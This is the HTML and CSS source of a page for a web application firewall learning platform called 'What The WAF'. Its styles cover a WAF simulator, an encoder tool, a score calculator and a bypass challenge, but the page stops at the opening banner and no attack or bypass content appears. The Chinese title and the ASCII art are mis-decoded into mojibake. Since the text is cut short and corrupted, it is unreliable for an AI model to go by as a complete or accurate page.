<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What The WAF - WAF å­¸ç¿’å¹³å°</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --phosphor: #00ff41;
            --phosphor-dim: #00cc33;
            --phosphor-glow: rgba(0, 255, 65, 0.15);
            --amber: #ffb000;
            --amber-dim: #cc8c00;
            --amber-glow: rgba(255, 176, 0, 0.15);
            --danger: #ff3333;
            --danger-glow: rgba(255, 51, 51, 0.15);
            --cyan: #00d4ff;
            --cyan-dim: #00a8cc;
            --obsidian: #0a0a0a;
            --obsidian-light: #141414;
            --surface: #1a1a1a;
            --surface-elevated: #242424;
            --text-primary: #e8e8e8;
            --text-secondary: #888888;
            --text-dim: #555555;
            --border: #2a2a2a;
            --border-glow: #333333;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Space Grotesk', system-ui, sans-serif;
            background: var(--obsidian);
            color: var(--text-primary);
            line-height: 1.7;
            position: relative;
            overflow-x: hidden;
        }

        /* Atmospheric Background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 65, 0.015) 2px,
                    rgba(0, 255, 65, 0.015) 4px
                ),
                radial-gradient(ellipse at 50% 0%, rgba(0, 255, 65, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* CRT Scanline Effect */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                to bottom,
                transparent 0px,
                transparent 1px,
                rgba(0, 0, 0, 0.15) 1px,
                rgba(0, 0, 0, 0.15) 2px
            );
            pointer-events: none;
            z-index: 9999;
            animation: scanlines 0.1s linear infinite;
        }

        @keyframes scanlines {
            0% { transform: translateY(0); }
            100% { transform: translateY(2px); }
        }

        /* Navigation */
        nav {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(10, 10, 10, 0.92);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border);
            z-index: 1000;
            padding: 0.875rem 2rem;
        }

        nav::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--phosphor-dim), transparent);
            opacity: 0.5;
        }

        nav .container {
            max-width: 1100px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--phosphor);
            letter-spacing: -0.02em;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            text-shadow: 0 0 20px var(--phosphor-glow);
        }

        .logo::before {
            content: '>';
            color: var(--text-dim);
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {
            50% { opacity: 0; }
        }

        .nav-links {
            display: flex;
            gap: 0.25rem;
            list-style: none;
        }

        .nav-links a {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: var(--text-secondary);
            text-decoration: none;
            padding: 0.5rem 0.875rem;
            border-radius: 4px;
            transition: all 0.2s ease;
            position: relative;
        }

        .nav-links a::before {
            content: './';
            color: var(--text-dim);
            opacity: 0;
            transition: opacity 0.2s;
        }

        .nav-links a:hover::before {
            opacity: 1;
        }

        .nav-links a:hover {
            color: var(--phosphor);
            background: var(--phosphor-glow);
        }

        /* Hero Section */
        .hero {
            padding: 10rem 2rem 6rem;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, var(--phosphor-glow) 0%, transparent 70%);
            opacity: 0.4;
            pointer-events: none;
        }

        .hero-ascii {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6rem;
            color: var(--text-dim);
            margin-bottom: 2rem;
            line-height: 1.2;
            letter-spacing: 0.1em;
            opacity: 0.6;
        }

        .hero h1 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 4rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            color: var(--text-primary);
            letter-spacing: -0.03em;
            position: relative;
        }

        .hero h1 .highlight {
            color: var(--phosphor);
            text-shadow: 0 0 30px var(--phosphor-glow), 0 0 60px var(--phosphor-glow);
            position: relative;
        }

        .hero p {
            font-size: 1.125rem;
            color: var(--text-secondary);
            max-width: 560px;
            margin: 0 auto 2.5rem;
            line-height: 1.8;
        }

        /* Container */
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        /* Section */
        section {
            padding: 5rem 0;
            position: relative;
        }

        section h2 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            font-weight: 500;
            margin-bottom: 2.5rem;
            color: var(--phosphor);
            text-transform: uppercase;
            letter-spacing: 0.15em;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        section h2::before {
            content: '//';
            color: var(--text-dim);
        }

        section h2::after {
            content: '';
            flex: 1;
            height: 1px;
            background: linear-gradient(90deg, var(--border), transparent);
        }

        /* Cards */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 1.25rem;
        }

        .card {
            background: var(--surface);
            padding: 1.75rem;
            border: 1px solid var(--border);
            position: relative;
            transition: all 0.3s ease;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background: var(--phosphor);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--phosphor-glow) 0%, transparent 50%);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .card:hover {
            border-color: var(--phosphor-dim);
            transform: translateX(4px);
        }

        .card:hover::before {
            opacity: 1;
        }

        .card:hover::after {
            opacity: 1;
        }

        .card h3 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.875rem;
            display: flex;
            align-items: center;
            gap: 0.625rem;
            position: relative;
            z-index: 1;
        }

        .card h3 .icon {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            font-weight: 500;
            color: var(--phosphor);
            opacity: 0.7;
            letter-spacing: 0.02em;
        }

        .card p {
            color: var(--text-secondary);
            font-size: 0.9375rem;
            position: relative;
            z-index: 1;
        }

        /* Attack Types */
        .attack-badge {
            font-family: 'JetBrains Mono', monospace;
            display: inline-block;
            padding: 0.25rem 0.625rem;
            font-size: 0.6875rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            margin-bottom: 1rem;
            border: 1px solid;
        }

        .badge-critical {
            background: var(--danger-glow);
            color: var(--danger);
            border-color: var(--danger);
        }

        .badge-high {
            background: var(--amber-glow);
            color: var(--amber);
            border-color: var(--amber);
        }

        .badge-medium {
            background: var(--phosphor-glow);
            color: var(--phosphor);
            border-color: var(--phosphor);
        }

        /* Code Block */
        .code-block {
            background: var(--obsidian);
            padding: 1.25rem;
            margin: 1rem 0;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8125rem;
            border: 1px solid var(--border);
            position: relative;
            line-height: 1.6;
        }

        .code-block::before {
            content: 'terminal';
            position: absolute;
            top: 0;
            right: 0;
            font-size: 0.625rem;
            color: var(--text-dim);
            padding: 0.375rem 0.625rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            border-left: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
        }

        .code-block code {
            color: var(--text-primary);
            white-space: pre;
            display: block;
        }

        .code-comment {
            color: var(--text-dim);
            font-style: italic;
        }

        .code-keyword {
            color: var(--cyan);
        }

        .code-string {
            color: var(--phosphor);
        }

        .code-danger {
            color: var(--danger);
        }

        /* Interactive Quiz */
        .quiz-container {
            background: var(--surface);
            padding: 2rem;
            border: 1px solid var(--border);
        }

        .quiz-question {
            margin-bottom: 1.5rem;
        }

        .quiz-question h4 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            margin-bottom: 1rem;
            color: var(--amber);
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .quiz-input {
            width: 100%;
            padding: 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            margin-bottom: 1rem;
            transition: border-color 0.2s;
        }

        .quiz-input:focus {
            outline: none;
            border-color: var(--phosphor-dim);
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 0.625rem;
        }

        .quiz-option {
            padding: 1rem 1.25rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            cursor: pointer;
            transition: all 0.2s ease;
            color: var(--text-secondary);
            font-size: 0.9375rem;
            position: relative;
            padding-left: 2.5rem;
        }

        .quiz-option::before {
            content: '';
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            width: 8px;
            height: 8px;
            border: 1px solid var(--text-dim);
            background: transparent;
            transition: all 0.2s;
        }

        .quiz-option:hover {
            border-color: var(--phosphor-dim);
            color: var(--text-primary);
        }

        .quiz-option:hover::before {
            border-color: var(--phosphor);
        }

        .quiz-option.correct {
            border-color: var(--phosphor);
            background: var(--phosphor-glow);
            color: var(--phosphor);
        }

        .quiz-option.correct::before {
            background: var(--phosphor);
            border-color: var(--phosphor);
            box-shadow: 0 0 10px var(--phosphor-glow);
        }

        .quiz-option.incorrect {
            border-color: var(--danger);
            background: var(--danger-glow);
            color: var(--danger);
        }

        .quiz-option.incorrect::before {
            background: var(--danger);
            border-color: var(--danger);
        }

        .btn {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.75rem 1.5rem;
            border: none;
            cursor: pointer;
            font-size: 0.8125rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background: var(--phosphor);
            color: var(--obsidian);
            font-weight: 600;
            position: relative;
            overflow: hidden;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.4s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            background: var(--phosphor-dim);
            box-shadow: 0 0 20px var(--phosphor-glow);
        }

        .btn-secondary {
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border);
        }

        .btn-secondary:hover {
            border-color: var(--phosphor-dim);
            color: var(--phosphor);
        }

        .result-box {
            padding: 1rem 1.25rem;
            margin-top: 1rem;
            display: none;
            border: 1px solid;
            font-size: 0.9375rem;
        }

        .result-box.show {
            display: block;
        }

        .result-success {
            background: var(--phosphor-glow);
            border-color: var(--phosphor-dim);
            color: var(--phosphor);
        }

        .result-error {
            background: var(--danger-glow);
            border-color: var(--danger);
            color: var(--danger);
        }

        /* WAF Rule Demo */
        .rule-demo {
            background: var(--surface);
            padding: 2rem;
            margin-top: 1.5rem;
            border: 1px solid var(--border);
            position: relative;
        }

        .rule-demo::before {
            content: 'WAF_SIMULATOR';
            position: absolute;
            top: -0.75rem;
            left: 1rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.625rem;
            color: var(--amber);
            background: var(--surface);
            padding: 0.25rem 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.15em;
            border: 1px solid var(--amber-dim);
        }

        .rule-demo h3 {
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 600;
            margin-bottom: 0.75rem;
            color: var(--text-primary);
        }

        /* WAF Architecture Diagram Styles */
        .waf-architecture {
            padding: 1.5rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            border-radius: 4px;
            overflow-x: auto;
        }

        .arch-flow {
            display: flex;
            align-items: flex-start;
            justify-content: center;
            gap: 0.5rem;
            min-width: max-content;
        }

        .arch-node {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        .arch-node-waf {
            padding-bottom: 200px;
        }

        .arch-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 1rem 1.25rem;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 4px;
            min-width: 100px;
            transition: all 0.2s;
        }

        .arch-box:hover {
            border-color: var(--phosphor-dim);
            box-shadow: 0 0 10px var(--phosphor-glow);
        }

        .arch-box-waf {
            border-color: var(--amber-dim);
            background: linear-gradient(135deg, var(--surface) 0%, rgba(255, 193, 7, 0.05) 100%);
        }

        .arch-box-waf:hover {
            border-color: var(--amber);
            box-shadow: 0 0 15px rgba(255, 193, 7, 0.2);
        }

        .arch-icon {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
        }

        .arch-label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-primary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .arch-desc {
            font-size: 0.625rem;
            color: var(--text-dim);
            margin-top: 0.5rem;
            text-align: center;
            max-width: 100px;
        }

        .arch-arrow {
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.5rem;
            color: var(--phosphor);
            padding: 0 0.25rem;
            margin-top: 1.25rem;
        }

        .arch-connector {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 0.75rem;
        }

        .arch-line-v {
            width: 2px;
            height: 20px;
            background: var(--amber);
        }

        .arch-arrow-down {
            color: var(--amber);
            font-size: 0.875rem;
            line-height: 1;
        }

        .rule-engine-box {
            position: absolute;
            top: 100%;
            left: 50%;
            transform: translateX(-50%);
            margin-top: 0.5rem;
            background: var(--surface);
            border: 1px solid var(--amber-dim);
            border-radius: 4px;
            padding: 1rem;
            min-width: 180px;
        }

        .rule-engine-header {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--amber);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            text-align: center;
            padding-bottom: 0.75rem;
            margin-bottom: 0.75rem;
            border-bottom: 1px solid var(--border);
        }

        .rule-engine-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .rule-engine-list li {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.375rem 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            color: var(--text-primary);
        }

        .rule-icon {
            font-size: 0.875rem;
        }

        .rule-hint {
            color: var(--text-dim);
            font-size: 0.625rem;
        }

        .rule-input-group {
            display: flex;
            gap: 0.75rem;
            margin-bottom: 1rem;
        }

        .rule-input-group input {
            flex: 1;
            padding: 0.875rem 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--phosphor);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            transition: all 0.2s;
        }

        .rule-input-group input:focus {
            outline: none;
            border-color: var(--phosphor-dim);
            box-shadow: 0 0 0 3px var(--phosphor-glow);
        }

        .rule-input-group input::placeholder {
            color: var(--text-dim);
        }

        .detection-result {
            padding: 1rem 1.25rem;
            margin-top: 1rem;
            border: 1px solid;
        }

        .detection-blocked {
            background: var(--danger-glow);
            border-color: var(--danger);
            animation: blocked-pulse 0.5s ease;
        }

        @keyframes blocked-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .detection-allowed {
            background: var(--phosphor-glow);
            border-color: var(--phosphor);
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 0.25rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            border-bottom: 1px solid var(--border);
            padding-bottom: 0.75rem;
        }

        .tab {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.625rem 1rem;
            background: transparent;
            border: 1px solid transparent;
            cursor: pointer;
            color: var(--text-dim);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            transition: all 0.2s ease;
            position: relative;
        }

        .tab::after {
            content: '';
            position: absolute;
            bottom: -0.8125rem;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--phosphor);
            transform: scaleX(0);
            transition: transform 0.2s;
        }

        .tab:hover {
            color: var(--text-secondary);
        }

        .tab.active {
            color: var(--phosphor);
            background: var(--phosphor-glow);
            border-color: var(--border);
        }

        .tab.active::after {
            transform: scaleX(1);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: tabFade 0.3s ease;
        }

        @keyframes tabFade {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Accordion */
        .accordion {
            border: 1px solid var(--border);
            overflow: hidden;
            margin-bottom: 0.75rem;
        }

        .accordion-header {
            padding: 1rem 1.25rem;
            background: var(--surface);
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.2s;
        }

        .accordion-header:hover {
            background: var(--surface-elevated);
        }

        .accordion-header h4 {
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 500;
            color: var(--text-primary);
            font-size: 0.9375rem;
        }

        .accordion-icon {
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            transition: transform 0.3s;
        }

        .accordion.active .accordion-icon {
            transform: rotate(180deg);
            color: var(--phosphor);
        }

        .accordion-content {
            padding: 0 1.25rem;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease;
            background: var(--obsidian-light);
        }

        .accordion.active .accordion-content {
            padding: 1.25rem;
            max-height: 2000px;
        }

        /* Progress Bar */
        .progress-container {
            margin-bottom: 2rem;
        }

        .progress-bar {
            height: 4px;
            background: var(--border);
            overflow: hidden;
            position: relative;
        }

        .progress-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                90deg,
                transparent,
                transparent 4px,
                var(--obsidian) 4px,
                var(--obsidian) 8px
            );
            z-index: 2;
        }

        .progress-fill {
            height: 100%;
            background: var(--phosphor);
            transition: width 0.5s ease;
            box-shadow: 0 0 10px var(--phosphor-glow);
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-top: 0.625rem;
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        /* Footer */
        footer {
            background: var(--obsidian);
            padding: 3rem 2rem;
            text-align: center;
            border-top: 1px solid var(--border);
            position: relative;
        }

        footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--phosphor-dim), transparent);
            opacity: 0.3;
        }

        footer p {
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            letter-spacing: 0.05em;
        }

        footer a {
            color: var(--phosphor);
            text-decoration: none;
            transition: color 0.2s;
        }

        footer a:hover {
            color: var(--phosphor-dim);
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .hero h1 {
                font-size: 2.5rem;
            }

            .hero-ascii {
                display: none;
            }

            .rule-input-group {
                flex-direction: column;
            }

            .card-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        @keyframes typewriter {
            from { width: 0; }
            to { width: 100%; }
        }

        .animate-in {
            animation: fadeIn 0.6s ease forwards;
            opacity: 0;
        }

        .glitch-text:hover {
            animation: glitch 0.3s ease;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--obsidian);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--phosphor-dim);
        }

        /* Selection */
        ::selection {
            background: var(--phosphor);
            color: var(--obsidian);
        }

        /* Focus visible */
        :focus-visible {
            outline: 2px solid var(--phosphor);
            outline-offset: 2px;
        }

        /* === NEW INTERACTIVE COMPONENTS === */

        /* Encoder Tool */
        .encoder-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
        }

        @media (max-width: 768px) {
            .encoder-container {
                grid-template-columns: 1fr;
            }
        }

        .encoder-box {
            background: var(--obsidian);
            border: 1px solid var(--border);
            padding: 1rem;
        }

        .encoder-box label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 0.1em;
            display: block;
            margin-bottom: 0.5rem;
        }

        .encoder-box textarea {
            width: 100%;
            height: 120px;
            background: var(--surface);
            border: 1px solid var(--border);
            color: var(--phosphor);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            padding: 0.75rem;
            resize: vertical;
            transition: border-color 0.2s;
        }

        .encoder-box textarea:focus {
            outline: none;
            border-color: var(--phosphor-dim);
        }

        .encoder-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
            margin-top: 1rem;
            justify-content: center;
        }

        .encoder-type-btn {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.5rem 1rem;
            background: var(--surface);
            border: 1px solid var(--border);
            color: var(--text-secondary);
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .encoder-type-btn:hover {
            border-color: var(--phosphor-dim);
            color: var(--phosphor);
        }

        .encoder-type-btn.active {
            background: var(--phosphor-glow);
            border-color: var(--phosphor);
            color: var(--phosphor);
        }

        .encoder-arrow {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: var(--phosphor);
        }

        @media (max-width: 768px) {
            .encoder-arrow {
                transform: rotate(90deg);
            }
        }

        /* Score Calculator */
        .score-calculator {
            background: var(--surface);
            border: 1px solid var(--border);
            padding: 1.5rem;
        }

        .score-display {
            text-align: center;
            padding: 1.5rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            margin-bottom: 1.5rem;
            position: relative;
            overflow: hidden;
        }

        .score-display::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, transparent 0%, var(--phosphor-glow) 100%);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .score-display.warning::before {
            background: linear-gradient(135deg, transparent 0%, var(--amber-glow) 100%);
            opacity: 1;
        }

        .score-display.blocked::before {
            background: linear-gradient(135deg, transparent 0%, var(--danger-glow) 100%);
            opacity: 1;
        }

        .score-number {
            font-family: 'JetBrains Mono', monospace;
            font-size: 4rem;
            font-weight: 700;
            color: var(--phosphor);
            position: relative;
            z-index: 1;
            transition: color 0.3s;
        }

        .score-display.warning .score-number {
            color: var(--amber);
        }

        .score-display.blocked .score-number {
            color: var(--danger);
            animation: blocked-pulse 0.5s ease;
        }

        .score-status {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            position: relative;
            z-index: 1;
        }

        .score-threshold {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--text-dim);
            margin-top: 0.25rem;
            position: relative;
            z-index: 1;
        }

        .violation-checklist {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 0.5rem;
        }

        .violation-item {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            cursor: pointer;
            transition: all 0.2s;
        }

        .violation-item:hover {
            border-color: var(--phosphor-dim);
        }

        .violation-item.checked {
            border-color: var(--phosphor);
            background: var(--phosphor-glow);
        }

        .violation-item.high-risk.checked {
            border-color: var(--danger);
            background: var(--danger-glow);
        }

        .violation-checkbox {
            width: 16px;
            height: 16px;
            border: 1px solid var(--text-dim);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            color: transparent;
            transition: all 0.2s;
            flex-shrink: 0;
        }

        .violation-item.checked .violation-checkbox {
            border-color: var(--phosphor);
            color: var(--phosphor);
        }

        .violation-item.high-risk.checked .violation-checkbox {
            border-color: var(--danger);
            color: var(--danger);
        }

        .violation-info {
            flex: 1;
            min-width: 0;
        }

        .violation-name {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--text-primary);
            word-break: break-all;
        }

        .violation-score {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            color: var(--text-dim);
        }

        /* Bypass Challenge */
        .challenge-container {
            background: var(--surface);
            border: 1px solid var(--border);
            padding: 1.5rem;
        }

        .challenge-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .challenge-level {
            display: flex;
            gap: 0.5rem;
        }

        .level-btn {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.5rem 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--text-dim);
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .level-btn:hover {
            border-color: var(--phosphor-dim);
            color: var(--text-secondary);
        }

        .level-btn.active {
            border-color: var(--phosphor);
            color: var(--phosphor);
            background: var(--phosphor-glow);
        }

        .level-btn.completed {
            border-color: var(--phosphor);
            color: var(--phosphor);
        }

        .level-btn.completed::after {
            content: ' âœ“';
        }

        .challenge-stats {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--text-dim);
        }

        .challenge-mission {
            background: var(--obsidian);
            border: 1px solid var(--border);
            padding: 1.25rem;
            margin-bottom: 1.5rem;
        }

        .challenge-mission h4 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            color: var(--amber);
            text-transform: uppercase;
            letter-spacing: 0.1em;
            margin-bottom: 0.75rem;
        }

        .challenge-target {
            font-family: 'JetBrains Mono', monospace;
            background: var(--surface);
            padding: 0.75rem;
            color: var(--danger);
            font-size: 0.875rem;
            margin: 0.75rem 0;
            border-left: 3px solid var(--danger);
        }

        .challenge-hint {
            font-size: 0.875rem;
            color: var(--text-secondary);
            margin-top: 0.75rem;
            padding: 0.75rem;
            background: var(--amber-glow);
            border: 1px solid var(--amber-dim);
            display: none;
        }

        .challenge-hint.show {
            display: block;
        }

        .challenge-input-area {
            margin-bottom: 1rem;
        }

        .challenge-input {
            width: 100%;
            padding: 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--phosphor);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            transition: all 0.2s;
        }

        .challenge-input:focus {
            outline: none;
            border-color: var(--phosphor-dim);
            box-shadow: 0 0 0 3px var(--phosphor-glow);
        }

        .challenge-actions {
            display: flex;
            gap: 0.75rem;
            flex-wrap: wrap;
        }

        .challenge-result {
            margin-top: 1rem;
            padding: 1rem;
            border: 1px solid;
            display: none;
        }

        .challenge-result.show {
            display: block;
        }

        .challenge-result.success {
            background: var(--phosphor-glow);
            border-color: var(--phosphor);
        }

        .challenge-result.fail {
            background: var(--danger-glow);
            border-color: var(--danger);
        }

        .challenge-result h5 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            margin-bottom: 0.5rem;
        }

        .challenge-result.success h5 {
            color: var(--phosphor);
        }

        .challenge-result.fail h5 {
            color: var(--danger);
        }

        /* Terminal typing effect */
        .terminal-output {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8125rem;
            color: var(--text-secondary);
            padding: 0.5rem 0;
        }

        .terminal-output .cmd {
            color: var(--phosphor);
        }

        .terminal-output .error {
            color: var(--danger);
        }

        .terminal-output .success {
            color: var(--phosphor);
        }

        .terminal-output .warning {
            color: var(--amber);
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="container">
            <div class="logo">what_the_waf</div>
            <ul class="nav-links">
                <li><a href="#intro">intro</a></li>
                <li><a href="#attacks">attacks</a></li>
                <li><a href="#rules">rules</a></li>
                <li><a href="#bypass">bypass</a></li>
                <li><a href="#tools">tools</a></li>
                <li><a href="#challenge">challenge</a></li>
                <li><a href="#quiz">quiz</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero">
        <pre class="hero-ascii">
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â•‘
